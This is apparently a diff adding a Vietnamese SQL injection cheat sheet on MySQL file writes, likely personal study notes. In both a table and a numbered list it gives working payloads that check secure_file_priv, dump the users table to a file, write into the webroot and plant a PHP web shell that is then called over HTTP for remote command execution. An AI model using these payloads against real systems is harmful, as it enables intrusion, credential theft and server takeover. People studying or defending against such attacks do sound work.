@@ -1,0 +1,38 @@
+| **Step**                      | **Query / Payload**                                                                                                                                                                | **Thông tin thu được / Hành động**                             | **Ý nghĩa**                                                                                                                                            |
+| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| 1️⃣ Kiểm tra quyền ghi file   | `SHOW VARIABLES LIKE 'secure_file_priv'; ' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Giá trị của biến `secure_file_priv` (empty / thư mục cụ thể / NULL) | Xác định có thể ghi file ở đâu: <br>- Empty → ghi bất kỳ đâu <br>- `/var/lib/mysql-files` → chỉ ghi được trong thư mục này <br>- NULL → không ghi được |
+| 2️⃣ Xuất dữ liệu ra file      | `SELECT * FROM users INTO OUTFILE '/tmp/credentials';`                                                                                                                        | Ghi toàn bộ bảng `users` ra file `/tmp/credentials`                 | Dùng để xuất dữ liệu DB thành file trên server                                                                                                         |
+| 3️⃣ Ghi chuỗi tùy ý ra file   | `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`                                                                                                                       | Tạo file text chứa chuỗi “this is a test”                           | Kiểm chứng có quyền ghi file                                                                                                                           |
+| 4️⃣ Payload ghi file qua SQLi | `' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -`                                                                                | Ghi chuỗi vào file `proof.txt` trong webroot                        | Kiểm tra có thể ghi ra webroot không                                                                                                                   |
+| 5️⃣ Viết web shell            | `' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -`                                                                         | Tạo file `shell.php` trong webroot chứa PHP webshell                | Cho phép remote command execution (RCE) qua HTTP request, ví dụ: `http://SERVER_IP/shell.php?0=id`                                                     |
+
+🔑 Ghi nhớ
+  Điều kiện cần để ghi file:
+  User DB có FILE privilege.
+  secure_file_priv không set NULL.
+  Có quyền ghi vào thư mục target (ví dụ: webroot).
+  Kỹ thuật: dùng SELECT ... INTO OUTFILE để ghi dữ liệu hoặc shell.
+  Ứng dụng thực tế: ghi webshell → RCE.
+
+
+
+
+
+1. Kiểm tra biến secure_file_priv ( check xem có thể đọc file ở vị trí nào, nếu k trả về gì nghĩa là bất kì vị trí nào cũng có thể đọc file )
+  ' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
+
+2. Xuất dữ liệu bảng ra file
+  SELECT * FROM users INTO OUTFILE '/tmp/credentials';
+
+3. Ghi chuỗi tùy ý ra file test
+  SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+4. Payload SQLi ghi file vào webroot
+  ' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
+    Check đã thành công chưa bằng cách : ' UNION SELECT 1,LOAD_FILE("/var/www/html/proof.txt"),3,4-- -
+
+5. Ghi Web Shell (PHP)
+  ' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
+  http://SERVER_IP/shell.php?0=id
+
+Check secure_file_priv → Test ghi file (/tmp) → Ghi proof.txt → Ghi webshell → RCE.
